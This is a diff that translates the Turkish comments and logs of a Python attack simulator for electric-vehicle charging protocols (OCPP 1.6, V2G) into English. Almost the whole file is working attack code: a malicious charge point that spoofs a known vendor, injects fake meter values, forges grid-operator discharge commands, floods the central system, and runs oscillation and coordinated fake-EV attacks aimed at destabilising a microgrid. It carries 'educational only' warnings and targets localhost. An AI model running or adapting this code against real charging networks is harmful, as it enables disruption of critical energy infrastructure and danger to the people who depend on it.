@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
 """
-V2G Protokol Manipülasyon Saldırısı Simülatörü
+V2G Protocol Manipulation Attack Simulator
 V2G Protocol Manipulation for Microgrid Destabilization
 
-Bu simülatör:
-1. OCPP/ISO 15118 protokollerini manipüle eder
-2. Sahte V2G komutları enjekte eder
-3. Koordineli saldırı ile şebeke dengesizliği oluşturur
-4. Çeşitli saldırı modlarını destekler
+This simulator:
+1. Manipulates OCPP/ISO 15118 protocols
+2. Injects fake V2G commands
+3. Creates grid instability via coordinated attacks
+4. Supports various attack modes
 
-UYARI: Bu simülatör sadece eğitim amaçlıdır!
+WARNING: This simulator is for educational purposes only!
 """
 
 import asyncio
@@ -24,7 +24,7 @@ from ocpp.v16 import ChargePoint as cp
 from ocpp.v16 import call
 from ocpp.v16.enums import RegistrationStatus
 
-# Loglama ayarları
+# Logging settings
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
@@ -33,16 +33,16 @@ logger = logging.getLogger(__name__)
 
 
 class AttackType(Enum):
-    """Saldırı Tipleri"""
-    INJECTION = "injection"      # Sahte veri enjeksiyonu
-    FLOODING = "flooding"        # DoS saldırısı
-    DESTABILIZE = "destabilize"  # Şebeke dengesizliği
-    OSCILLATION = "oscillation"  # V2G osilasyonu
-    SPOOFING = "spoofing"        # Kimlik sahteciliği
+    """Attack Types"""
+    INJECTION = "injection"      # Fake data injection
+    FLOODING = "flooding"        # DoS attack
+    DESTABILIZE = "destabilize"  # Grid destabilization
+    OSCILLATION = "oscillation"  # V2G oscillation
+    SPOOFING = "spoofing"        # Identity spoofing
 
 
 class MaliciousStation(cp):
-    """Kötü Amaçlı Şarj İstasyonu Simülatörü"""
+    """Malicious Charging Station Simulator"""
     
     def __init__(self, station_id, websocket, attack_type=AttackType.INJECTION):
         super().__init__(station_id, websocket)
@@ -53,10 +53,10 @@ class MaliciousStation(cp):
         self.fake_power = 0
     
     async def send_boot_notification(self):
-        """Boot notification (görünüşte meşru)"""
-        # Spoofing saldırısı: Meşru üretici ismi kullan
+        """Boot notification (seemingly legitimate)"""
+        # Spoofing attack: Use legitimate vendor name
         if self.attack_type == AttackType.SPOOFING:
-            vendor = "ABB"  # Meşru üretici gibi görün
+            vendor = "ABB"  # Appear as a legitimate vendor
             model = "Terra AC Wallbox"
         else:
             vendor = "BSG-Attack"
@@ -67,24 +67,24 @@ class MaliciousStation(cp):
             charge_point_vendor=vendor
         )
         
-        logger.info(f"🎭 [SALDIRI] Boot notification gönderiliyor...")
-        logger.info(f"   Sahte Üretici: {vendor}")
-        logger.info(f"   Sahte Model: {model}")
+        logger.info(f"[ATTACK] Sending Boot Notification...")
+        logger.info(f"   Fake Vendor: {vendor}")
+        logger.info(f"   Fake Model: {model}")
         
         try:
             response = await self.call(request)
             if response.status == RegistrationStatus.accepted:
-                logger.info(f"✅ CSMS kandırıldı! Saldırgan kabul edildi.")
+                logger.info(f"[SUCCESS] CSMS fooled! Attacker accepted.")
                 return response.interval
             else:
-                logger.warning(f"⚠️ CSMS reddetti: {response.status}")
+                logger.warning(f"[WARNING] CSMS rejected: {response.status}")
                 return None
         except Exception as e:
-            logger.error(f"❌ Boot hatası: {e}")
+            logger.error(f"[ERROR] Boot error: {e}")
             return None
     
     async def send_heartbeat_loop(self, interval):
-        """Normal heartbeat (şüphe çekmemek için)"""
+        """Normal heartbeat (to avoid suspicion)"""
         while True:
             await asyncio.sleep(interval)
             try:
@@ -93,17 +93,17 @@ class MaliciousStation(cp):
                 pass
     
     async def inject_fake_v2g_data(self, power_kw, duration_sec=5):
-        """Sahte V2G verisi enjekte et"""
+        """Inject fake V2G data"""
         self.attack_count += 1
         self.fake_power = power_kw * 1000  # W
         
-        logger.info(f"\n{'🚨'*20}")
-        logger.info(f"[SALDIRI #{self.attack_count}] SAHTE V2G VERİSİ ENJEKSİYONU")
-        logger.info(f"{'🚨'*20}")
-        logger.info(f"   Sahte Güç: {power_kw} kW")
-        logger.info(f"   Hedef: Mikro şebekeyi dengesizleştir")
+        logger.info(f"\n{'!'*20}")
+        logger.info(f"[ATTACK #{self.attack_count}] FAKE V2G DATA INJECTION")
+        logger.info(f"{'!'*20}")
+        logger.info(f"   Fake Power: {power_kw} kW")
+        logger.info(f"   Target: Destabilize microgrid")
         
-        # Sahte MeterValues gönder
+        # Send fake MeterValues
         energy_wh = (self.fake_power * duration_sec) / 3600
         self.energy_exported += energy_wh
         
@@ -134,51 +134,51 @@ class MaliciousStation(cp):
         
         try:
             await self.call(request)
-            logger.info(f"   ✅ Sahte veri enjekte edildi!")
-            logger.info(f"   Toplam sahte enerji: {self.energy_exported/1000:.2f} kWh")
+            logger.info(f"   [SUCCESS] Fake data injected!")
+            logger.info(f"   Total fake energy: {self.energy_exported/1000:.2f} kWh")
         except Exception as e:
-            logger.error(f"   ❌ Enjeksiyon başarısız: {e}")
+            logger.error(f"   [ERROR] Injection failed: {e}")
     
     async def send_fake_v2g_command(self, power_kw):
-        """Sahte V2G komutu gönder"""
+        """Send fake V2G command"""
         self.attack_count += 1
         
         data = {
             'command': 'StartDischarge',
             'power_kw': power_kw,
             'priority': 'HIGH',
-            'source': 'GridOperator',  # Sahte kaynak
+            'source': 'GridOperator',  # Fake source
             'timestamp': datetime.now(timezone.utc).isoformat()
         }
         
         request = call.DataTransfer(
-            vendor_id='GridServices',  # Sahte vendor
+            vendor_id='GridServices',  # Fake vendor
             message_id='V2G_StartDischarge',
             data=json.dumps(data)
         )
         
-        logger.info(f"\n[SALDIRI #{self.attack_count}] SAHTE V2G KOMUTU")
-        logger.info(f"   Sahte Komut: StartDischarge")
-        logger.info(f"   Sahte Kaynak: GridOperator")
-        logger.info(f"   Güç: {power_kw} kW")
+        logger.info(f"\n[ATTACK #{self.attack_count}] FAKE V2G COMMAND")
+        logger.info(f"   Fake Command: StartDischarge")
+        logger.info(f"   Fake Source: GridOperator")
+        logger.info(f"   Power: {power_kw} kW")
         
         try:
             response = await self.call(request)
             if response.status == 'Accepted':
-                logger.info(f"   ✅ Sahte komut kabul edildi!")
+                logger.info(f"   [SUCCESS] Fake command accepted!")
             else:
-                logger.warning(f"   ⚠️ Komut reddedildi: {response.status}")
+                logger.warning(f"   [WARNING] Command rejected: {response.status}")
         except Exception as e:
-            logger.error(f"   ❌ Komut hatası: {e}")
+            logger.error(f"   [ERROR] Command error: {e}")
     
     async def flooding_attack(self, messages_per_second=10, duration_sec=30):
-        """DoS saldırısı - Aşırı mesaj göndererek sunucuyu bunalt"""
-        logger.info(f"\n{'💥'*20}")
-        logger.info(f"[SALDIRI] FLOODING DoS SALDIRISI BAŞLIYOR")
-        logger.info(f"{'💥'*20}")
-        logger.info(f"   Hız: {messages_per_second} mesaj/saniye")
-        logger.info(f"   Süre: {duration_sec} saniye")
-        logger.info(f"   Toplam: ~{messages_per_second * duration_sec} mesaj")
+        """DoS attack - Overwhelm the server with excessive messages"""
+        logger.info(f"\n{'!'*20}")
+        logger.info(f"[ATTACK] FLOODING DoS ATTACK STARTING")
+        logger.info(f"{'!'*20}")
+        logger.info(f"   Rate: {messages_per_second} messages/second")
+        logger.info(f"   Duration: {duration_sec} seconds")
+        logger.info(f"   Total: ~{messages_per_second * duration_sec} messages")
         
         start_time = asyncio.get_event_loop().time()
         end_time = start_time + duration_sec
@@ -187,7 +187,7 @@ class MaliciousStation(cp):
         while asyncio.get_event_loop().time() < end_time:
             for _ in range(messages_per_second):
                 try:
-                    # Rastgele mesaj tipleri
+                    # Random message types
                     msg_type = random.choice(['meter', 'data', 'status'])
                     
                     if msg_type == 'meter':
@@ -215,53 +215,53 @@ class MaliciousStation(cp):
                     pass
             
             await asyncio.sleep(1)
-            logger.info(f"   📊 Gönderilen: {message_count} mesaj")
+            logger.info(f"   [STATUS] Sent: {message_count} messages")
         
-        logger.info(f"\n✅ Flooding saldırısı tamamlandı: {message_count} mesaj gönderildi")
+        logger.info(f"\n[SUCCESS] Flooding attack completed: {message_count} messages sent")
     
     async def oscillation_attack(self, cycles=10, power_kw=22):
-        """V2G osilasyon saldırısı - Şebeke frekansını bozmak için"""
-        logger.info(f"\n{'🔄'*20}")
-        logger.info(f"[SALDIRI] V2G OSİLASYON SALDIRISI")
-        logger.info(f"{'🔄'*20}")
-        logger.info(f"   Döngü: {cycles}")
-        logger.info(f"   Güç: ±{power_kw} kW")
-        logger.info(f"   Hedef: Şebeke frekans dengesizliği")
+        """V2G oscillation attack - To disrupt grid frequency"""
+        logger.info(f"\n{'!'*20}")
+        logger.info(f"[ATTACK] V2G OSCILLATION ATTACK")
+        logger.info(f"{'!'*20}")
+        logger.info(f"   Cycles: {cycles}")
+        logger.info(f"   Power: +/-{power_kw} kW")
+        logger.info(f"   Target: Grid frequency instability")
         
         for cycle in range(cycles):
-            # Pozitif faz (şebekeye gönder)
-            logger.info(f"\n   [{cycle+1}/{cycles}] ⬆️ +{power_kw} kW (Şebekeye)")
+            # Positive phase (send to grid)
+            logger.info(f"\n   [{cycle+1}/{cycles}] [+] +{power_kw} kW (To Grid)")
             await self.inject_fake_v2g_data(power_kw, duration_sec=3)
             await asyncio.sleep(3)
             
-            # Negatif faz (şebekeden çek)
-            logger.info(f"   [{cycle+1}/{cycles}] ⬇️ Şarj moduna geç")
+            # Negative phase (draw from grid)
+            logger.info(f"   [{cycle+1}/{cycles}] [-] Switch to charge mode")
             await self.inject_fake_v2g_data(0, duration_sec=3)
             await asyncio.sleep(3)
         
-        logger.info(f"\n✅ Osilasyon saldırısı tamamlandı: {cycles} döngü")
+        logger.info(f"\n[SUCCESS] Oscillation attack completed: {cycles} cycles")
     
     async def coordinated_destabilization(self, num_fake_evs=5, power_per_ev=11):
-        """Koordineli şebeke dengesizliği saldırısı"""
-        logger.info(f"\n{'⚡'*20}")
-        logger.info(f"[SALDIRI] KOORDİNELİ ŞEBEKE DENGESİZLİĞİ")
-        logger.info(f"{'⚡'*20}")
-        logger.info(f"   Sahte EV sayısı: {num_fake_evs}")
-        logger.info(f"   EV başına güç: {power_per_ev} kW")
-        logger.info(f"   Toplam saldırı gücü: {num_fake_evs * power_per_ev} kW")
-        logger.info(f"   Hedef: Ani yük değişimi ile şebeke çökmesi")
+        """Coordinated grid destabilization attack"""
+        logger.info(f"\n{'!'*20}")
+        logger.info(f"[ATTACK] COORDINATED GRID DESTABILIZATION")
+        logger.info(f"{'!'*20}")
+        logger.info(f"   Fake EV count: {num_fake_evs}")
+        logger.info(f"   Power per EV: {power_per_ev} kW")
+        logger.info(f"   Total attack power: {num_fake_evs * power_per_ev} kW")
+        logger.info(f"   Target: Grid collapse via sudden load change")
         
-        # Her "sahte EV" için ayrı mesaj gönder
+        # Send separate messages for each "fake EV"
         for ev_num in range(num_fake_evs):
             ev_id = f"FAKE_EV_{ev_num+1:03d}"
-            logger.info(f"\n   🚗 {ev_id} saldırıya katılıyor...")
+            logger.info(f"\n   [JOIN] {ev_id} joining attack...")
             
-            # Sahte V2G verisi
+            # Fake V2G data
             data = {
                 'ev_id': ev_id,
                 'power_kw': power_per_ev,
                 'action': 'immediate_discharge',
-                'bypass_safety': True  # Güvenlik bypass işareti
+                'bypass_safety': True  # Safety bypass flag
             }
             
             try:
@@ -271,32 +271,32 @@ class MaliciousStation(cp):
                     data=json.dumps(data)
                 ))
                 
-                # Sahte MeterValues
+                # Fake MeterValues
                 await self.inject_fake_v2g_data(power_per_ev, duration_sec=2)
                 
             except Exception as e:
-                logger.warning(f"   ⚠️ {ev_id} hatası: {e}")
+                logger.warning(f"   [WARNING] {ev_id} error: {e}")
             
-            await asyncio.sleep(0.5)  # Kısa gecikme
+            await asyncio.sleep(0.5)  # Short delay
         
-        logger.info(f"\n{'⚡'*20}")
-        logger.info(f"SALDIRI TAMAMLANDI!")
-        logger.info(f"Toplam sahte güç enjekte edildi: {num_fake_evs * power_per_ev} kW")
-        logger.info(f"{'⚡'*20}\n")
+        logger.info(f"\n{'!'*20}")
+        logger.info(f"ATTACK COMPLETED!")
+        logger.info(f"Total fake power injected: {num_fake_evs * power_per_ev} kW")
+        logger.info(f"{'!'*20}\n")
     
     async def start_attack(self):
-        """Saldırıyı başlat"""
+        """Start the attack"""
         logger.info(f"\n{'='*70}")
-        logger.info(f"🎭 SALDIRI BAŞLATILIYOR")
+        logger.info(f"[START] ATTACK STARTING")
         logger.info(f"{'='*70}")
-        logger.info(f"   Saldırı Tipi: {self.attack_type.value}")
-        logger.info(f"   İstasyon ID: {self.station_id}")
+        logger.info(f"   Attack Type: {self.attack_type.value}")
+        logger.info(f"   Station ID: {self.station_id}")
         logger.info(f"{'='*70}\n")
         
         await asyncio.sleep(3)
         
         if self.attack_type == AttackType.INJECTION:
-            # Sürekli sahte veri enjeksiyonu
+            # Continuous fake data injection
             for i in range(10):
                 power = random.randint(10, 30)
                 await self.inject_fake_v2g_data(power, duration_sec=5)
@@ -312,20 +312,20 @@ class MaliciousStation(cp):
             await self.coordinated_destabilization(num_fake_evs=5, power_per_ev=11)
         
         elif self.attack_type == AttackType.SPOOFING:
-            # Meşru komutmuş gibi V2G komutları gönder
+            # Send V2G commands as if legitimate
             for _ in range(5):
                 await self.send_fake_v2g_command(random.randint(10, 22))
                 await asyncio.sleep(5)
         
         logger.info(f"\n{'='*70}")
-        logger.info(f"📊 SALDIRI ÖZETİ")
+        logger.info(f"[SUMMARY] ATTACK SUMMARY")
         logger.info(f"{'='*70}")
-        logger.info(f"   Toplam Saldırı: {self.attack_count}")
-        logger.info(f"   Enjekte Edilen Enerji: {self.energy_exported/1000:.2f} kWh (sahte)")
+        logger.info(f"   Total Attack: {self.attack_count}")
+        logger.info(f"   Injected Energy: {self.energy_exported/1000:.2f} kWh (fake)")
         logger.info(f"{'='*70}\n")
     
     async def start(self):
-        """İstasyonu başlat ve saldırıyı gerçekleştir"""
+        """Start station and perform attack"""
         interval = await self.send_boot_notification()
         
         if interval:
@@ -335,36 +335,36 @@ class MaliciousStation(cp):
                 return_exceptions=True
             )
         else:
-            logger.error("❌ Boot başarısız, saldırı yapılamıyor")
+            logger.error("[ERROR] Boot failed, attack aborted")
 
 
 async def main():
-    """Ana program"""
+    """Main program"""
     import sys
     
-    # Komut satırı argümanları
+    # Command line arguments
     attack_type = AttackType.INJECTION
     
     if len(sys.argv) > 1:
         arg = sys.argv[1].lower()
         if arg in ['--help', '-h']:
             print("""
-V2G Protocol Manipulation Saldırısı Simülatörü
+V2G Protocol Manipulation Attack Simulator
 
-Kullanım:
-  python v2g_attacker.py [saldırı-tipi]
+Usage:
+  python v2g_attacker.py [attack-type]
 
-Saldırı Tipleri:
-  injection    - Sahte V2G verisi enjeksiyonu (varsayılan)
-  flooding     - DoS saldırısı (aşırı mesaj)
-  oscillation  - V2G osilasyonu (frekans dengesizliği)
-  destabilize  - Koordineli şebeke dengesizliği
-  spoofing     - Kimlik sahteciliği
+Attack Types:
+  injection    - Fake V2G data injection (default)
+  flooding     - DoS attack (excessive messages)
+  oscillation  - V2G oscillation (frequency instability)
+  destabilize  - Coordinated grid destabilization
+  spoofing     - Identity spoofing
 
-Örnek:
+Example:
   python v2g_attacker.py destabilize
 
-UYARI: Bu araç sadece eğitim ve test amaçlıdır!
+WARNING: This tool is for educational and testing purposes only!
             """)
             return
         
@@ -379,21 +379,21 @@ UYARI: Bu araç sadece eğitim ve test amaçlıdır!
         if arg in attack_map:
             attack_type = attack_map[arg]
         else:
-            print(f"❌ Geçersiz saldırı tipi: {arg}")
-            print("Geçerli tipler: injection, flooding, oscillation, destabilize, spoofing")
+            print(f"[ERROR] Invalid attack type: {arg}")
+            print("Valid types: injection, flooding, oscillation, destabilize, spoofing")
             return
     
     station_id = f"ATTACK_{datetime.now().strftime('%H%M%S')}"
     csms_url = f"ws://localhost:9000/{station_id}"
     
     logger.info("="*70)
-    logger.info("🎭 V2G PROTOCOL MANIPULATION ATTACK SIMULATOR")
+    logger.info("[START] V2G PROTOCOL MANIPULATION ATTACK SIMULATOR")
     logger.info("="*70)
-    logger.warning("⚠️  UYARI: Bu araç sadece eğitim amaçlıdır!")
-    logger.warning("⚠️  Gerçek sistemlere karşı kullanımı yasaktır!")
+    logger.warning("[WARNING] WARNING: This tool is for educational purposes only!")
+    logger.warning("[WARNING] Usage against real systems is prohibited!")
     logger.info("="*70)
-    logger.info(f"   Saldırı Tipi: {attack_type.value}")
-    logger.info(f"   Hedef CSMS: {csms_url}")
+    logger.info(f"   Attack Type: {attack_type.value}")
+    logger.info(f"   Target CSMS: {csms_url}")
     logger.info("="*70)
     
     try:
@@ -401,7 +401,7 @@ UYARI: Bu araç sadece eğitim ve test amaçlıdır!
             csms_url,
             subprotocols=['ocpp1.6']
         ) as ws:
-            logger.info("✅ CSMS'e bağlandı!")
+            logger.info("[SUCCESS] Connected to CSMS!")
             
             attacker = MaliciousStation(station_id, ws, attack_type)
             
@@ -412,13 +412,13 @@ UYARI: Bu araç sadece eğitim ve test amaçlıdır!
             )
             
     except websockets.exceptions.WebSocketException as e:
-        logger.error(f"❌ Bağlantı hatası: CSMS çalışmıyor ({e})")
+        logger.error(f"[ERROR] Connection error: CSMS may not be running ({e})")
     except Exception as e:
-        logger.error(f"❌ Hata: {e}", exc_info=True)
+        logger.error(f"[ERROR] Error: {e}", exc_info=True)
 
 
 if __name__ == '__main__':
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n👋 Saldırı durduruldu")
+        print("\n[STOP] Attack stopped")
